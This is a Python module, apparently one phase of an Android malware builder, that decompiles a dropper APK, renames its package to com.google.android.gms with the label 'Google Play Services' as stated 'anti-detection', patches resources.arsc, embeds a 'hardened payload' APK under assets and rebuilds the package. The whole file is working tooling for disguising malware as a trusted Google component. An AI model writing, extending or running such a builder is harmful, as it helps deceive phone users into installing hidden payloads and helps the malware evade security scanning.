"""Phase 3: Dropper Identity + EMBED Payload (NP Manager + MT Manager).

Steps:
3.1 Change Package Name → com.google.android.gms
3.2 Fix AndroidManifest.xml
3.3 Fix resources.arsc (MT Manager)
3.4 General Editor (icon + name)
3.5 EMBED payload → assets/output.apk
3.6 Update HTML year
"""
import os, subprocess, shutil, re
from config import TEMP_DIR, APKTOOL, TEMPLATE_DIR
from utils.logger import setup_logger
from utils.package_rename import rename_package

logger = setup_logger()


def _fix_manifest(decompiled, old_pkg, new_pkg):
    """3.2: Fix AndroidManifest.xml using binary-safe package_rename utility."""
    from utils.package_rename import rename_package
    rename_package(decompiled, old_pkg, new_pkg)
    logger.info(f"[+] 3.2 Manifest fixed (binary-safe): {old_pkg} → {new_pkg}")


def _fix_arsc(decompiled, old_pkg, new_pkg):
    """3.3: MT Manager — binary patch resources.arsc."""
    logger.info("[*] 3.3 ARSC Editor (MT Manager)")
    arsc = os.path.join(decompiled, 'resources.arsc')
    if not os.path.exists(arsc):
        return
    with open(arsc, 'rb') as f:
        data = bytearray(f.read())
    old_b = old_pkg.encode('utf-8')
    new_b = new_pkg.encode('utf-8')
    if len(new_b) < len(old_b):
        new_b = new_b + b'\x00' * (len(old_b) - len(new_b))
    idx = 0
    count = 0
    while True:
        idx = data.find(old_b, idx)
        if idx == -1:
            break
        data[idx:idx + len(old_b)] = new_b[:len(old_b)]
        count += 1
        idx += len(old_b)
    with open(arsc, 'wb') as f:
        f.write(data)
    if count > 0:
        logger.info(f"[+] 3.3 ARSC patched: {count} occurrences")


def _embed_payload(decompiled, payload_apk):
    """3.5: EMBED hardened payload into assets/."""
    assets_dir = os.path.join(decompiled, 'assets')
    os.makedirs(assets_dir, exist_ok=True)

    # Delete any existing placeholder
    for name in ['output.apk', 'base.apk', 'update.apk']:
        p = os.path.join(assets_dir, name)
        if os.path.exists(p):
            os.remove(p)

    # Copy hardened payload as output.apk
    dest = os.path.join(assets_dir, 'output.apk')
    shutil.copy(payload_apk, dest)
    logger.info(f"[+] 3.5 EMBED: {os.path.basename(payload_apk)} → assets/output.apk ({os.path.getsize(dest)} bytes)")


def _update_html(assets_dir):
    """3.6: Update HTML year."""
    html = os.path.join(assets_dir, 'main_ui.html')
    if os.path.exists(html):
        with open(html, 'r', errors='ignore') as f:
            c = f.read()
        c = c.replace('2025', '2026')
        with open(html, 'w', errors='ignore') as f:
            f.write(c)
        logger.info("[+] 3.6 HTML year 2025 → 2026")


def run(unsigned_dropper, hardened_payload_apk, base_info=None):
    """Phase 3: Identity + Embed → dropper_embedded.apk (unsigned).

    Args:
        unsigned_dropper: Path from Phase 2
        hardened_payload_apk: Path from Phase 1 (output.apk)
        base_info: Dict with payload info
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 3: Dropper Identity + EMBED Payload")
    logger.info("=" * 60)

    # Dropper identity is ALWAYS com.google.android.gms (Layer 1 anti-detection)
    # Phase 3 renames dropper package; Phase 1 already hardened the payload
    base_pkg = 'com.google.android.gms'
    base_label = 'Google Play Services'
    old_pkg = 'com.amanmehra.installer'

    # Decompile unsigned dropper
    logger.info("[*] Decompiling dropper for identity + embed...")
    decompiled = str(TEMP_DIR / "phase3_decompiled")
    r = subprocess.run([APKTOOL, "d", "--no-res", "-f", "-o", decompiled, unsigned_dropper],
                       capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        raise Exception(f"apktool d failed: {r.stderr[:500]}")
    res_dir = os.path.join(decompiled, "res")
    if os.path.exists(res_dir):
        shutil.rmtree(res_dir)

    # 3.1: Change Package Name
    logger.info(f"[*] 3.1 Package rename: {old_pkg} → {base_pkg}")
    rename_package(decompiled, old_pkg, base_pkg)

    # 3.2: Fix AndroidManifest.xml
    _fix_manifest(decompiled, old_pkg, base_pkg)

    # 3.3: Fix resources.arsc
    _fix_arsc(decompiled, old_pkg, base_pkg)

    # 3.4: General Editor (icon + name) → already done in Phase 2 manifest
    logger.info("[+] 3.4 General Editor (icon + name) → done in Phase 2")

    # 3.5: EMBED payload
    _embed_payload(decompiled, hardened_payload_apk)

    # 3.6: Update HTML
    _update_html(os.path.join(decompiled, 'assets'))

    # Rebuild
    logger.info("[*] Rebuilding embedded dropper...")
    embedded = str(TEMP_DIR / "dropper_embedded.apk")
    r = subprocess.run([APKTOOL, "b", "-o", embedded, decompiled],
                       capture_output=True, text=True, timeout=180)
    if r.returncode != 0:
        r = subprocess.run([APKTOOL, "b", "--use-aapt2", "-o", embedded, decompiled],
                           capture_output=True, text=True, timeout=180)
        if r.returncode != 0:
            raise Exception(f"apktool b failed: {r.stderr[:500]}")

    shutil.rmtree(decompiled, ignore_errors=True)
    logger.info(f"[+] Phase 3 Complete: {embedded}")
    return embedded
